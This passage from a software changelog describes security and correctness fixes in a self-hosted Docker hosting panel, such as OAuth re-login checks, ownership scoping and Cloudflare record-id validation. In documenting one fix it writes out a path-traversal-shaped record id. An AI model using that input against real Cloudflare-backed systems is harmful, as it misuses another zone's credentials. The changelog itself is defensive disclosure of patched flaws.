+**Fixed — a GPU workload with no HTTP traffic was auto-slept out from under itself.** `container_sleep_config.gpu_enabled` existed since v2.something's GPU-passthrough work but had no reader or writer anywhere: `deploy`'s own `gpu_enabled` flag reached Docker's HostConfig and stopped there, and `auto_sleep_idle_containers` judged idleness purely from nginx-derived HTTP traffic — real for a web app, meaningless for a container doing headless GPU compute. Fixed in two parts: `deploy` now seeds `container_sleep_config.gpu_enabled` the moment a container exists (without touching an admin's own `auto_sleep_enabled`/`sleep_after_minutes` choice on conflict), and the auto-sleeper now asks the agent's own `/apps/gpu-info` for a live process attributed to the container's name, treating that exactly like real HTTP traffic when deciding idleness.
+
+**Withdrawn — the Stripe subscription-billing surface.** `routes/billing.rs` was a complete, actively-hardened Checkout/Customer-Portal/webhook integration with zero UI trigger, sitting in direct contradiction with the product's own stated identity ("Zero subscriptions", "no premium tier and nothing is held back") — and even reachable it sold nothing, since `plan_server_limit` has been unconditionally unlimited for every user since v2.176's enforcement-removal migration. Removed the routes, the `STRIPE_SECRET_KEY`/`STRIPE_WEBHOOK_SECRET` config, the `stripe_price_*` settings and their Settings.tsx panel, and the now-inert `users.stripe_customer_id`/`stripe_subscription_id`/`plan`/`plan_status`/`plan_server_limit` columns (migration `20260906010000_drop_stripe_billing.sql`). `routes/whmcs.rs`'s own unrelated write to `users.plan` (a WHMCS-provisioning concept, not Stripe's) was repointed to the column that's actually read back, `whmcs_service_map.plan`. See FEATURES.md's Withdrawn Claims table.
+
+**Not changed — three findings confirmed already-fine or out of scope for a mechanical fix.** The Restic backup scheduler/retry/alert gap remains genuinely unreachable from any shipped UI or CLI (unchanged since v2.207.0), so it stays a zero-exposure future-session item. `GET /api/servers/{id}/metrics` remains a legitimate documented, API-key-gated public API surface with no first-party page to slot a caller into. `GET /api/container-policies/{user_id}/usage` returns a live fleet-wide count with no per-user filter and no bulk form — wiring a per-row usage bar today would visually claim per-user data that isn't real; filed as a deferred-scope register entry instead of a quick wire-up.
+
+## [2.227.0]
+
+### Fixed — a returning OAuth login only ever checked the provider's NAME, never the provider's own account id
+
+`oauth.rs`'s callback handler links and re-authenticates an existing account by
+email plus provider name alone; `oauth_id` — the provider's own permanent
+account identifier — was captured on first link but never consulted again on
+a returning login. Flagged as a security-hardening fork by the first-ever
+Loose-Ends Audit (v2.223.0) and left deferred since; re-verified against
+current source this session before acting on it, per this project's own
+audit-verification standard.
+
+The realistic way this bites is an email changing hands **at the provider**
+rather than at DockPanel — a departed employee's mailbox reassigned to a new
+hire's fresh Google/GitHub/GitLab account. That new account has a different
+permanent id but the same verified email and the same provider name, and the
+old check would have logged the new person straight into the departed
+employee's dockpanel account and role.
+
+Closed by extending the existing three-way link/reject decision to a fourth
+arm: a matching provider name with a mismatched `oauth_id` now fails closed,
+the same way a mismatched provider name already did. `oauth_id` is only ever
+written together with `oauth_provider` (the link `UPDATE` and the auto-create
+`INSERT`), so no legitimate returning login can trip the new check — verified
+by re-running the full backend suite (474/474, unchanged) and by a live
+mutation test (reverting just the new branch reproduces the exact silent-login
+gap and turns the new pin red; restoring it turns the pin green again). 6 new
+regression pins added to `oauth-csrf-pin-e2e.sh` §C.
+
+## [2.226.0]
+
+### Added — WordPress vulnerability scanning has a schedule and an alert, matching its Docker-image peer
+
+`wordpress::vuln_scan` (the toolkit's manual "Scan" button) stored a scan
+result and raised nothing — no schedule, no page, no bell — while its direct
+peer, Docker image scanning, has carried a 30-minute background sweep and a
+full fire/resolve alert lifecycle since v2.something. A site with a
+critically-vulnerable plugin stayed invisible until an operator happened to
+reopen its toolkit and click Scan. Flagged high-severity by the first-ever
+Loose-Ends Audit (v2.223.0) and left as the standing next-priority carry since.
+
+Closed by giving it the exact shape its peer already has: the manual scan's
+store-and-alert logic moved into a shared `wordpress::scan_and_store`, now
+called by both the manual endpoint and a new `wp_vuln_scanner` background
+service (the 16th supervised service) that sweeps every WordPress site on
+every online fleet member every 30 minutes. One deliberate divergence from the
+image scanner: a WordPress site belongs to one user, not the whole fleet, so
+the alert pages that site's owner (`sites.user_id`) rather than fanning out to
+every admin. New Settings → WordPress Vulnerability Scanning card (enable +
+rescan interval, both off by default so no existing install's behaviour
+changes silently), a new `wp_vuln_scan` alert type wired into the Settings
+mute grid and the Alerts.tsx filter, and 8 new regression pins proving the
+resolve-before-fire ordering, the per-site-owner routing, and the background
+sweep's wiring — mutation-tested against the real source, not just written.
+
+### Fixed — 59 of 147 Docker App catalogue templates were pinned to `:latest`
+
+A deploy from the app catalogue is not reproducible: two operators deploying
+"n8n" a month apart could get different images, and the SSL/backup/scan
+machinery elsewhere in the project treats an image tag as meaningful metadata.
+Open since v2.51-ish (the catalogue's own `:latest` count), never
+force-repointed because a **guessed** version tag is exactly how issue #103
+shipped 18 unpullable dead references.
+
+Re-litigated by verifying, live against each registry (Docker Hub, ghcr.io,
+quay.io, docker.dragonflydb.io), which of the 78 remaining `:latest`-pinned
+templates resolve to a tag that is the byte-identical manifest `:latest`
+already points to — a zero-behavior-change pin, never a guess. 59 qualified
+and were re-pinned to that exact tag. The remaining 19 stay on `:latest`
+because no such tag exists at all (checked, not assumed): some registries
+build `:latest` off a branch/commit rather than a numbered release
+(`erpnext`'s `:latest` IS its `develop` branch), and some simply publish no
+equivalent tag in reach. Documented in-source rather than left silent. A new
+regression pin (`app-template-images-pin-e2e.sh` §8, mutation-tested) asserts
+none of the 59 drifts back to `:latest`.
+
+## [2.225.0]
+
+### Fixed — a dedicated audit of Docker Apps' Docker-orchestration file found two real gaps, one of them in v2.224.0's own SSL fix
+
+A dedicated fan-out sweep of `panel/agent/src/services/docker_apps.rs` for the
+swallowed-`.ok()` bug class (the standing next-priority carry from v2.223.0's
+loose-ends audit) found the premise itself was a category error: this file
+owns no database dependency at all, so the class doesn't exist here — the
+actual instance that motivated the carry was already fixed in the
+same-named-but-different `routes/docker_apps.rs` (backend crate) at v2.222.0.
+Corrected the standing note rather than the code.
+
+The sweep did find two real, independently-verified defects instead:
+
+**`blue_green_update` swallowed its promotion.** After nginx had already been
+swapped to the new container, the old container's stop/remove and the new
+container's rename were each discarded with `.ok()`, and the function reported
+success unconditionally. If the remove ever failed, the rename would then fail
+too (the name was still taken) — also swallowed — leaving the correctly-serving
+container stuck under its temporary name and the stopped original orphaned
+under the real one, both carrying the same management labels, so the app would
+list twice until someone manually removed the ghost. The identical bug, in the
+sibling `git_build.rs::blue_green_update` (which shares `find_free_port`/
+`health_check_port`/`swap_nginx_proxy_port` with this function), was
+root-caused and fixed in v2.55.0 — that fix was never ported to this twin.
+Ported now: the promotion frees the old container's name with a checked,
+rollback-able rename *before* anything is destroyed, matching the twin exactly.
+Currently prospective on this install (zero blue-green updates have run here),
+not a reported incident.
+
+**v2.224.0's own SSL-ownership fix had no backfill.** The new
+`docker_app_domains` table was only ever written going forward, at deploy — any
+Docker App already running before the v2.224.0 upgrade never gets a row and
+stays exactly as unrenewable as before that release, contradicting its own
+changelog claim. `docker_stacks`' analogous migration backfilled with a plain
+`UPDATE` because every stack already had a row to update from; a Docker App
+has none (`domain_claim`'s own comment: "Docker apps are not rows"), so
+recovering one means asking each server's agent what is actually deployed.
+Added `reconcile_docker_app_domains`, run once per scheduled security scan
+(self-healing, not a one-time migration-time step): it asks the agent's own
+`/apps` listing, and inserts an owner row — deliberately with `tls_mode`/
+`ssl_email` left unconfirmed rather than guessed — for any already-running app
+with a domain that doesn't have one yet. A reconciled row's certificate mode is
+treated as distinctly *unconfirmed*, not the same as a real `none`, so the
+renewal fallback still declines to touch it but says why instead of silently
+matching nothing.
+
+Both findings came out of the same fan-out: the primary sweep (which also
+re-verified GitHub #110 and #125 as already fixed, live at HEAD) plus a
+completeness critic that opened the newest commit in the tree instead of only
+the file named in the brief — the commit everyone's own `git status` was
+reading, sitting unopened the whole time.
+
+## [2.224.0]
+
+### Fixed — Docker Apps' auto-provisioned SSL certificates now renew, and have a manual fix path
+
+The highest-severity finding left over from v2.223.0's loose-ends audit: a
+Docker App's SSL certificate (auto-provisioned at deploy, ACME or a registered
+certificate) had no owner row anywhere in the database, so neither of the
+panel's two existing renewal doors — a `sites` lookup, and the Compose-stack
+fallback right beside it — could ever find one to renew. The weekly
+filesystem-walk scan still raised the `ssl_expiry` warning (visibility was
+never the gap), but nothing ever acted on it, and there was no manual "renew"
+control either — a Docker App behind a domain would silently go back to HTTP
+once its certificate expired.
+
+Closed with a new, deliberately minimal `docker_app_domains` table (migration
+`20260905180000_docker_app_ssl_domains.sql`) recording only what a renewal
+decision needs — owner, server, TLS mode, ACME contact — written at deploy and
+removed at teardown, mirroring `docker_stacks`' own SSL columns. Wired into the
+scanner's existing reactive fallback chain as a third door
+(`renew_docker_app_certificate`, sibling of the Compose-stack arm: same
+host-scoping discipline, same TLS-mode guard so a `provided`/operator-uploaded
+certificate is never overwritten, same foreign-issuer guard, same per-host
+cooldown under its own action string). Because that fallback already runs both
+on the weekly schedule and whenever an admin clicks Scan, this closes the
+manual fix path too — no new UI control was needed.
+
+## [2.223.0]
+
+### Fixed — first-ever loose-ends audit: 11 severed pairs closed across both crates, the frontend, and 3 doc files
+
+The first run, ever, of a cross-cutting "severed pair" audit (a writer with no
+reader, an endpoint with no caller, a doc that contradicts the code beside it)
+rather than the usual per-file rotation — which is structurally blind to this
+class of gap. 6 finder dimensions, 20 verified candidates, 11 closed this
+release:
+
+- **`site_lock` (the v2.222.0 concurrency fix) missed `enable_ssl_for_site`.**
+  All 9 site-mutating entry points it was wired into hold a per-domain lock;
+  the SSL-enable path — which does the identical tmp-write+rename on the same
+  nginx vhost file, and is called from 6 different sites (provision, upload,
+  renew, DNS-01, Docker-app auto-SSL, git-deploy auto-SSL) — did not. Now
+  locked once, inside `enable_ssl_for_site` itself, closing all 6 callers at
+  once.
+- **7 `retention_*` data-retention settings had no operator control.**
+  `auto_healer`'s nightly cleanup has read them since GAP 67, but no key was
+  ever added to `ALLOWED_KEYS`, so every install was permanently stuck at the
+  hardcoded defaults with no way to change them. Now settable (validated
+  1-3650 days) with a new "Data Retention" section in Settings.
+- **`WordPress.tsx` collapsed a failed request into "Not Detected."** A
+  timeout, an unreachable agent, or contention from the new `site_lock` queue
+  all landed in the same bare `catch`, which showed a false "No wp-config.php
+  found" plus an Install-over-it button for a site that was merely
+  unreachable. Now shows a distinct error + Retry, mirroring the fix already
+  applied to `Databases.tsx`'s equivalent bug.
+- **6 "Create"/"Add" buttons silently no-op'd on an empty required field** —
+  Extensions, Servers, Files (create + rename), ResellerUsers, and SiteDetail's
+  Add Alias. No error, no disabled state, nothing: a full-looking, clickable
+  button that does nothing. Now `disabled` on the same guard condition, matching
+  the pattern already used correctly on Cdn.tsx/Migration.tsx/Apps.tsx/Dns.tsx.
+- **Three `FEATURES.md`/`docs/api-reference.md` claims had gone stale**: API
+  keys still said "authenticate nothing" a release after `dp_`-prefixed keys
+  were wired into real auth (v2.221.0) — narrowed to the `dpiac_`/`dpx_`
+  families, which are unaffected; the mail Withdrawn-Claims row still said
+  clients are redirected away from mail management, a release after v2.102.0
+  gave them 9 real scoped endpoints and the redirect was removed; and
+  Auto-Optimization's "(via Settings)" claim was simply false — the backend and
+  agent are fully wired, but zero frontend code has ever called it.
+- **A `whmcs.rs` comment claimed a background task migrates containers between
+  servers.** No such task exists anywhere in the tree — the row is written once
+  and stuck at `in_progress` forever (already correctly documented in
+  `FEATURES.md` §Withdrawn Claims; the source comment just never matched it).
+- **`monitors.maintenance_until`** — added, never wired to any INSERT/UPDATE/
+  SELECT, superseded by the separate `maintenance_windows` table that shipped
+  instead. Dropped.
+- **`GET /api/update/fleet/{id}`** had no caller — the list endpoint already
+  returns full per-server progress, so nothing ever needed the single-run
+  fetch the docs told operators to poll. Docs corrected to describe the
+  endpoint actually used.
+- **A dead top-level `Extensions` lazy-import** left over from the Extensions→
+  Integrations tab consolidation shipped its own JS chunk that no route ever
+  loaded. Removed.
+
+9 further findings — Docker Apps' auto-provisioned SSL certs get no renewal
+and no manual fix path (Sites and Docker Stacks both get renewal sweeps),
+Restic backups skip the entire scheduler/retry/alert layer local backups get,
+WordPress vuln-scanning has no schedule and never alerts on critical CVEs, two
+orphaned columns, unreachable billing checkout/portal routes, two dead
+dashboard endpoints, and a container-policy usage endpoint with no reader —
+are real but need a product/architecture decision, not a mechanical fix;
+tracked for a future session.
+
+## [2.222.0]
+
+### Fixed — WordPress Toolkit second-pass audit: version-comparison correctness, a dead vuln-detail list, and zero site-level concurrency control
+
+A second-pass fan-out audit on `wp_vulnerability.rs` (already fully audited once,
+v2.206.0) found and fixed:
+
+- **`version_lt` silently dropped unparseable version segments** rather than
+  failing the comparison, which shifted every later segment left by one
+  position — a positional corruption that could report a vulnerable plugin as
+  clean, or a patched one as vulnerable, whenever its version string carried a
+  qualifier suffix (`-beta`, `-rc1`). Now fails closed: any segment that isn't
+  a plain integer makes the comparison report "vulnerable" rather than guess.
+  Mutation-tested — the new pin suite goes red against the old logic.
+- **The WordPress vuln-detail list has never rendered, for any scan, ever.**
+  The frontend read a `.vulnerabilities` field that has never existed on the
+  wire (the real field is nested per-plugin, `plugin_vulns[].vulnerabilities`)
+  — found independently by this session's own skeptic pass, which caught the
+  finder's characterization of "current behavior" as wrong. Fixed by reading
+  the real shape and flattening it for display; also now shows when a scan
+  ran and that it checks against 14 known plugin vulnerabilities, not a live
+  feed — both were computed and sent by the backend already, just never read.
+- **No site-level concurrency control existed anywhere in the agent crate.**
+  WordPress hardening (`apply_hardening`) and the update-with-rollback flow
+  could interleave on the same site: a hardening fix applied while an update
+  was mid-flight could be silently discarded if the update's post-check
+  failed and rolled back to a pre-hardening snapshot. The same gap existed
+  for backup restore, staging file sync/clone/delete, and git deploy — none
+  of them coordinated with each other or themselves. New `site_lock` module
+  (a per-domain async lock registry) is now held by all 9 site-mutating entry
+  points for the duration of their work.
+- **`wp_hardening` was a write-only table** — every security check has
+  persisted a row since the table was created (2026-03-19), and nothing ever
+  read it back, so "last checked" information existed in Postgres but was
+  unreachable from the UI. New `GET /wordpress/{id}/hardening-history`
+  endpoint and a "Checked Xh ago" / "Never checked" caption on each site's
+  security card.
+- **Off-menu (completeness/setup critics): Docker Apps wake/sleep silently
+  swallowed a DB write failure**, which could permanently desync
+  `is_sleeping` from the container's real state (a running container stuck
+  "asleep" and excluded from the auto-sleep sweeper forever, or the reverse).
+  The underlying Docker action already succeeded by the time this runs, so
+  the request still can't fail on it — but the failure is now logged instead
+  of silently discarded.
+
+## [2.221.0]
+
+### Added — the CLI can now restore a backup's DATABASE, not just its files
+
+`dockpanel backup restore` talked only to the local agent, which has no access to
+the panel's database credentials — an archive containing a database dump could
+never be fully restored from the CLI, only from the panel UI. Closed by wiring up
+`routes/api_keys.rs`'s previously-unwired `dp_`-prefixed API key scaffold
+(self-documented in FEATURES.md's "Withdrawn Claims" section as authenticating
+nothing) into `AuthUser`, so a key mints and authenticates exactly like a session
+JWT on every `AuthUser`-gated handler:
+
+- `panel/backend/src/auth.rs`: a `dp_`-prefixed bearer token is now hashed and
+  looked up in `api_keys` before any JWT decode is attempted, building the same
+  `Claims` shape a login would.
+- New `panel/cli/src/backend_client.rs`: a second CLI client (alongside
+  `client.rs`, which talks to the local agent) that talks to the panel API over
+  HTTP — base URL resolved from `/etc/dockpanel/api.env`'s own `LISTEN_ADDR`, the
+  key read from `/etc/dockpanel/backend.token` (root-only, mirrors
+  `agent.token`'s pattern). `cmd_backup_restore` now prefers this path when a key
+  is configured, resolving domain → site id and filename → backup id through the
+  panel's own listing endpoints, then following the same async restore + SSE
+  progress stream the panel UI's own Restore button uses.
+- Falls back to the pre-existing agent-only (files-only) restore path, unchanged,
+  when no key is configured — every install predating this release keeps working
+  exactly as before.
+
+**Caught before shipping by a 3-lens adversarial skeptic review** (correctness,
+completeness, blast-radius) against the initial cut, all four fixed:
+
+- API keys silently survived **"Revoke all sessions" and the Panic Button** —
+  both explicitly promise a total logout, but the key path never consulted
+  `sessions_revoked_at`. Fixed by comparing the key's own `created_at` against
+  the last revocation timestamp (a key has no `iat` of its own to re-derive); a
+  key rotated or minted after the revocation keeps working, same as a fresh
+  login would.
+- The CLI's SSE-stream reader latched "restore failed" off ANY intermediate
+  step carrying `status: "error"` — but the restore handler deliberately emits a
+  non-fatal advisory in that shape for a files-only archive restored onto a
+  database-attached site, and still finishes successfully. Fixed to decide
+  pass/fail from the terminal `complete` step's own status only, matching the
+  panel UI's own rule.
+- The CLI's domain→site-id lookup (`GET /api/sites`) is owner-scoped only, while
+  the restore endpoints it feeds also admit an administrator of the site's
+  machine — an admin's key could restore a site it administers but doesn't own
+  once it had the id, yet the CLI's own lookup would 404 first. Fixed with a
+  `GET /api/admin/sites` fallback.
+- `authenticate_api_key()`'s failures used the `session_invalid()` marker, whose
+  own doc comment reserves it for browser sessions that can be "lost" — a key is
+  the same session-less credential class as an agent token. Switched to a plain
+  401, matching `authenticate_agent()`.
+
+Also added, found during the same review: a `UNIQUE` index on `api_keys.key_hash`
+(the migration that created the table indexed `key_prefix`, never queried by, but
+not the column the actual lookup filters on — every key-authenticated request was
+sequential-scanning the whole table), and a byte-buffered SSE frame reader (the
+prior per-chunk `String::from_utf8_lossy` could corrupt a multi-byte character
+split across a chunk boundary).
+
+**Live-fire proof, not just source pins**: a throwaway Vultr VPS ran the real
+published v2.220.0 install, then had these locally-built binaries swapped in.
+Drove, through the CLI's own command, all of: a real database restored to a
+planted marker row (files AND database, end to end); an old key immediately
+refused after "Revoke all sessions", a freshly-minted one working right after;
+the exact files-only-metadata-but-real-DB-dump scenario that reproduced the
+"Restore failed" false negative pre-fix, now reporting success; and an admin's
+key restoring a site owned by a different user via the `/api/admin/sites`
+fallback. Box destroyed, account swept (0 instances / 0 snapshots / 0 reserved
+IPs / 0 block storage), no DNS touched (`.example` domains, IP-only install).
+
+New pin suite `tests/api-key-auth-pin-e2e.sh`, 17 assertions, mutation-tested via
+`git stash` (whole-feature-absent baseline) and targeted single-bug reintroductions
+against the otherwise-fixed code for the three highest-severity findings.
+
+## [2.220.0]
+
+### Fixed — the graceful-shutdown watchdog's root cause: no long-lived connection ever watched the shutdown signal
+
+The demo deploy's own `systemctl stop dockpanel-api` triggered the graceful-shutdown watchdog
+(`main.rs::shutdown_signal`, a 20s hard timeout) for the first time in 12 sessions of monitoring — a
+genuine forced exit (`std::process::exit(1)`, systemd `status=1/FAILURE`), not another clean
+non-trigger. Root cause: `axum::serve(...).with_graceful_shutdown(...)` waits for every in-flight
+connection to close on its own, and a WebSocket or SSE handler that only exits when the client
+disconnects (or, for the provision-log SSE streams, when the underlying job finishes) can block that
+drain indefinitely — axum spawns each connection onto its own task that the shutdown signal resolving
+does not cancel.
+
+Fixed by threading a shutdown broadcast into every long-lived connection handler in the crate:
+
+- `AppState` gained `shutdown_tx: broadcast::Sender<()>`, the same channel `spawn_supervised` already
+  hands every background service, plus a shared `helpers::shutdown_signal_fut(&AppState)` future that
+  resolves on the first broadcast.
+- `ws_metrics.rs::handle_socket` (the only axum `WebSocketUpgrade` site in the crate — `terminal.rs` and
+  `logs.rs` exist here too but only mint signed tickets; the browser dials the agent's websocket
+  directly, so neither ever holds a connection open through this process) now races its whole per-tick
+  fetch/send/recv cycle against the shutdown signal via `tokio::select!`, not just a
+  check at the top of the loop — a single agent call already budgets up to 60s, which alone exceeds the
+  20s drain window.
+- All 6 SSE handlers in the crate — `notifications.rs::stream` (keyed on the process-lifetime
+  `notif_tx` broadcast, so this stream would otherwise never end on its own; every admin tab with the
+  panel open holds one) plus the 5 provision-log-shaped streams (`sites.rs`, `git_deploys.rs`,
+  `docker_apps.rs`, `system.rs`, `migration.rs`) — now end with `.take_until(shutdown_signal_fut(...))`.
+- **Caught before shipping by an adversarial skeptic review**: the first cut sent the broadcast *after*
+  `axum::serve(...).with_graceful_shutdown(...).await` returned — but that await never returns until
+  every connection (including the ones now waiting on this exact signal) has already closed, making the
+  fix circular and a no-op for its own stated purpose. Fixed by moving the send inside
+  `shutdown_signal()` itself, which axum polls *before* it starts draining connections, so subscribers
+  get the broadcast the instant the OS signal arrives. The same review also flagged the metrics
+  websocket's trailing close-frame send as unbounded against a black-holed peer; now wrapped in a 2s
+  timeout so it can't stall that connection's own drain.
+
+New pin suite `tests/shutdown-drain-race-pin-e2e.sh` (22 assertions, mutation-tested).
+
+## [2.219.0]
+
+### Fixed — batched small-file tail audit: drill timeout, ws revocation, and three unscoped backup-management routes
+
+`dockpanel-fanout` run as 3 structured topics (scheduling-runbooks, observability, fleet-lifecycle)
+across the last 14 never-audited files in the `panel/backend/src/{routes,services}` rotation. Found
+and fixed 5 issues, 4 on-menu and 1 off-menu:
+
+- **A scheduled or on-demand backup drill's agent call was capped at 60s total round trip, but the
+  restore it triggers is budgeted 220s (mariadb) to 360s (volume)** — any drill against a non-trivial
+  backup was killed by the client and recorded `status = 'failed'`, a false DR-failure signal on a
+  healthy backup. Fixed both `drill_scheduler.rs` (scheduled) and `backup_orchestrator.rs`'s
+  `trigger_drill` (on-demand) via a new `DRILL_TIMEOUT_SECS` (420s), the same `post_long` pattern
+  `DB_RESTORE_TIMEOUT_SECS` already established for real restores in this file.
+- **`drill_scheduler.rs`'s `tick()` stamped `last_drill_at` unconditionally BEFORE dispatch**, so a
+  policy whose server had been unreachable for weeks (or that kept losing the concurrency guard to a
+  sibling policy) read as "freshly drilled" on every cron tick — the one case a DR-verification
+  timestamp most needs to flag was the case it hid. Fixed: the stamp now only advances once a drill
+  actually enqueues.
+- **The live-metrics websocket (`ws_metrics.rs`) validated the JWT — expiry, blacklist, global session
+  revocation, admin role — only at handshake**, never again for the life of the connection. Logout, the
+  panic button, and `POST /auth/revoke-all` all closed the door to new connections but left an
+  already-open socket streaming the full process/network/GPU/system feed for as long as the TCP
+  connection stayed alive, unbounded even by the token's own nominal expiry — directly undermining the
+  panic button's own stated purpose. Fixed: every 5s tick now re-validates and closes the socket the
+  instant any handshake condition would now reject it.
+- **`chain_report_json`/`chain_report_pdf` and `list_all_backups` accepted a caller-supplied backup id
+  / listed the whole fleet with no ownership scoping** — any admin could pull another admin's full
+  chain-of-trust report (site domain, db/container:volume names, filenames, hash chain, every
+  verification and drill) as JSON or PDF, with `list_all_backups` as the exact discovery channel for
+  the ids needed. Identical bug class already fixed once in this file for `list_volume_backups`
+  (v2.184.0) — missed for these two. Fixed: every query now scopes by `is_local OR user_id = caller`,
+  mirroring the v2.184.0 remedy.
+- **(off-menu, completeness critic) `backup_destinations.rs`'s `list`/`update`/`remove`/
+  `test_connection` all queried or mutated a destination by bare id, gated only by admin role** —
+  asymmetric with `create` in the same file, which already scopes `server_id` by ownership. A second
+  admin could overwrite another admin's S3/SFTP destination credentials; the next scheduled backup for
+  any policy pointing at it would silently upload the target server's data into the second admin's own
+  bucket. Fixed: all four now scope by the same `is_local OR user_id = caller` predicate `create`
+  already established.
+
+New pin suite `tests/drill-ws-backup-scope-pin-e2e.sh` (29 assertions), mutation-tested via `git
+stash` of the 5 touched files (23/23 fix-assertions correctly red pre-fix, 6/6 controls green
+throughout).
+
+## [2.218.0]
+
+### Fixed — `telemetry.rs`+`telemetry_collector.rs` audit: a false transparency claim, an on-call paging gap, and a defense-in-depth container guard
+
+Continuing the `panel/backend/src/{routes,services}` rotation onto its own standing next candidate
+(`routes/telemetry.rs` + `services/telemetry_collector.rs`, a genuine routes+service pair with zero
+non-cosmetic commits and zero prior memory citations). A `dockpanel-fanout` finder/skeptic/critics pass
+found and fixed three issues, two on the two-file menu and one off-menu:
+
+- **`GET /api/telemetry/preview` asserted "this is exactly what would be sent" over a `system` block
+  built from the agent's full host-fingerprint endpoint** (hostname, OS, kernel, memory, disk, cpu,
+  uptime, service list) — but the function that actually POSTs to the configured endpoint,
+  `send_pending_events`, never receives an `AgentClient` at all, and sends only
+  `{dockpanel_version, installation_id}`. The false claim existed in two independent places: the
+  backend JSON `note` field and a separately hardcoded footer in the frontend's Preview modal
+  (`Telemetry.tsx`). Direction of the error is over-claiming what leaves the box, not a leak — but it
+  contradicted the tool's own stated honesty commitment on a privacy-sensitive, opt-in feature, live
+  regardless of the `telemetry_enabled` toggle (`preview` has no gate on it). Fixed by narrowing the
+  claim in both places rather than widening the real payload, which would have been the arming move.
+- **(off-menu, completeness critic) `on_call.rs`'s `validate_members_exist` only checked submitted
+  member UUIDs existed, with no ownership check** — the exact sibling gap
+  `escalation_policies.rs`'s `validate_user_routes` closed for `user:<uuid>` escalation steps at s437,
+  missed here because a schedule's member list is a different path into the same paging sink. An
+  admin could add any other user's UUID (discoverable via `GET /api/users`) as a rotation member of a
+  schedule they own, and pages routed at that schedule would deliver to the victim's real
+  email/Slack/Discord/PagerDuty/webhook with no consent. Fixed: the member check now requires
+  self-or-managed (`id = $2 OR reseller_id = $2`), mirroring `validate_user_routes`.
+- **(setup critic, defense-in-depth) the agent's `remove_database` force-removed a container (with
+  volumes) by id with no check that it actually carries `dockpanel.managed=true`** — unlike its
+  sibling `require_managed()`/`is_managed_labels()` in `docker_apps.rs` (v2.15.0), which this module
+  never had. Every current caller of `DELETE /databases/{cid}` sources `container_id` from the panel's
+  own DB row (written once, from this module's own create response, never from user input), so this is
+  hardening rather than a live-reachable gap. Fixed: `remove_database` now inspects the container and
+  refuses to act on one missing the managed label.
+
+New pin suite `tests/telemetry-oncall-db-audit-pin-e2e.sh`, 13 assertions, mutation-tested via `git
+stash` of the 4 touched source files — all 10 fix-assertions confirmed red pre-fix, all 3 controls
+green throughout.
+
+## [2.217.0]
+
+### Fixed — `panel/backend/src/{routes,services}`'s first dedicated audit of `dns.rs`, `security.rs`, and the panel self-update orchestrator
+
+`panel/backend/src/{routes,services}` (90 files, ~78K LOC) is the original, most-worked pool in this
+project, but its own exhaustion status had never been directly re-verified the way the agent crate
+(v2.215.0) and `panel/cli/src` (v2.216.0) both have been. A LOC-rank + two-direction pre-selection check
+(git-log + memory-mention grep, filtering out a cosmetic mass-commit that touches nearly every backend
+file) surfaced five files with genuinely zero prior dedicated scrutiny. A full `dockpanel-fanout`
+finder/skeptic/critics run found 4 real, independently-verified defects across those files, plus one
+off-menu completeness-critic find in `databases.rs`.
+
+**`dns.rs`'s `update_record`/`delete_record` interpolated an unvalidated Cloudflare record id straight
+into the outbound API URL.** A `"../../../zones/OTHER/dns_records/RECID"`-shaped id (percent-encoded to
+survive the reverse proxy) reroutes the request — carrying the zone's own decrypted Cloudflare token —
+to an arbitrary Cloudflare API path (another zone's records, `/zones`, `/accounts/*`, `/user/tokens/verify`).
+Fixed: `record_id` is now validated as Cloudflare's real 32-char lowercase-hex format before use, on the
+Cloudflare code path only (PowerDNS's record id is a different, safely-parsed hex-encoded composite, left
+unchanged).
+
+**`security.rs`'s `compliance_report` built its HTML report by raw string-interpolating scan-derived
+findings with no escaping**, served as `text/html` and opened directly by the frontend's own "Download
+Report" link. Malware/secrets scans record real filesystem paths verbatim; a compromised hosted site can
+name a file so its path becomes a stored-XSS payload the admin's browser executes on next view. Fixed:
+severity/title/description/remediation are HTML-escaped before interpolation.
+
+**(Off-menu, completeness critic) `databases.rs`'s `create()` authorized against the fleet-wide
+site-caller predicate, but `list`/`credentials`/`remove`/`get_db_info`/`pitr_config` all required strict
+self-ownership** — so a database an admin creates on a tenant's site they don't personally own (the
+local-box admin arm) becomes permanently invisible to its own creator on every other endpoint. Fixed: the
+read/manage handlers now use the same admin-widening predicate `create()` already does.
+
+**`panel_update.rs`'s `build_fleet_plan` had no admin-widening**, unlike its sibling call sites
+(`servers.rs::list`, `dashboard.rs`) — a fleet-wide update run silently skipped every server a *different*
+admin had registered, reporting success with nothing indicating the plan was incomplete. Fixed: mirrors
+the established `($2 OR user_id = $1)` convention.
+
+**`update.rs`'s `apply_fleet(include_panel: true)` bypassed the panel's own downgrade guard** —
+`reject_apply_target`'s direction/advertised-match check that `apply_update` enforces was never called on
+this path, so it could reinstall any syntactically-valid version, not merely a stale-advertised one.
+Fixed: `apply_fleet` now runs the same check before including the panel in a fleet run.
+
+**`panel_update.rs`'s concurrent-apply guard was check-then-later-write, with the multi-minute
+`create_snapshot` pipeline running entirely inside the race window** — two requests within that window
+both passed the guard and both spawned their own snapshot + detached `update.sh`. Fixed: the guard now
+reserves `InFlight` atomically under one write-lock hold, before any async work starts; a failed snapshot
+releases the reservation. `rollback_to_snapshot` gets the same guard — it previously had none at all, so a
+rollback could race an in-progress apply's binary swap.
+
+New pin suite `tests/backend-hot-file-audit-pin-e2e.sh` (25 assertions), mutation-tested via `git stash`
+of the 5 touched source files: all 21 fix-assertions red pre-fix, all 4 controls green throughout.
+
+## [2.216.0]
+
+### Fixed — `panel/cli/src/commands/{db,backup,iac}.rs` full audit pass, and an off-menu agent orphan-process gap
+
+Direct continuation of v2.215.0: `db.rs`, `backup.rs`, and `iac.rs` were the 3 files that session's
+finder excluded from `panel/cli/src`'s fanout, reasoning "already partially checked at v2.197.0" — true
+only for one narrow bug class (plaintext DB passwords in argv). A full `dockpanel-fanout` finder/skeptic/
+critics run this session found 7 real, independently-verified defects across those 3 files plus one
+off-menu completeness-critic find in the agent crate.
+
+**`dockpanel backup verify --type database` always attempted a Postgres restore, regardless of the
+database's real engine.** `db_type` was hardcoded to `"postgres"` with no `--db-type` flag to override
+it, so a mysql/mariadb backup could never be successfully verified through the CLI — it would always
+misdispatch to the Postgres restore path and report the backup FAILED, even when it was fine. Fixed:
+`dockpanel backup verify` now takes `--db-type` (default `postgres`, for backward compatibility).
+
+**`dockpanel backup health` miscounted "site backups" by folding in every other backup subsystem's own
+root.** The top-level walk under `/var/backups/dockpanel` treated `databases/`, `volumes/`,
+`wp-snapshots/`, `snapshots/`, `.staging/`, `.snapshot-staging/`, and an unrelated ops `db/` dump
